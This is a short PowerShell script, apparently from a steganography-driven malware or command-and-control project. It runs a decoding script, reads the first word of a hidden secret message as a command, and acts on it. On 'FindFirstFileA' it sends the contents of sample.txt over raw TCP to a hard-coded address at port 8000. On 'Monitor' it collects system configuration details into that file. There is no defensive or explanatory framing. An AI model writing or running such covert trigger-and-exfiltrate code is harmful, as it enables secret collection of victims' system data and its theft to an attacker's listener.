# Set the paths to the PowerShell scripts and the file to send
$powerDecodeScript = "power_decode.ps1"
$checkSecretScript = "check_secret.ps1"
$fileToSend = "sample.txt"

# Execute the power_steg.ps1 script
Write-Host "Executing power_decode.ps1 script..."
. $powerDecodeScript

# Check the first word of secret.txt using check_secret.ps1
Write-Host "Checking the first word of secret.txt..."
. $checkSecretScript

# If the first word is "FindFirstFileA", send the file over TCP
if ($firstWord -eq "FindFirstFileA") {
    $remoteIPAddress = "192.168.215.154"  # Replace with the destination IP address
    $remotePort = 8000                 # Replace with the destination port number

    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($remoteIPAddress, $remotePort)
        $stream = $client.GetStream()

        # Read the file content and send it over the TCP connection
        $fileContent = Get-Content -Path $fileToSend -Raw
        $fileBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
        $stream.Write($fileBytes, 0, $fileBytes.Length)

        Write-Host "File sent successfully over TCP."
    } catch {
        Write-Host "Failed to establish a TCP connection or send the file."
    } finally {
        $stream.Close()
        $client.Close()
    }
} else {
    Write-Host "The first word of the secret message is not 'FindFirstFileA'."
}


if ($firstWord -eq "Monitor") {

    # Get system configuration details
    $systemConfig = Get-WmiObject -Class Win32_ComputerSystem
    $systemConfig | Out-File -FilePath "sample.txt" -Encoding ASCII

    Write-Host "System configuration details written to sample.txt"
} else {
    Write-Host "The first word of the secret message is not 'Monitor'."
}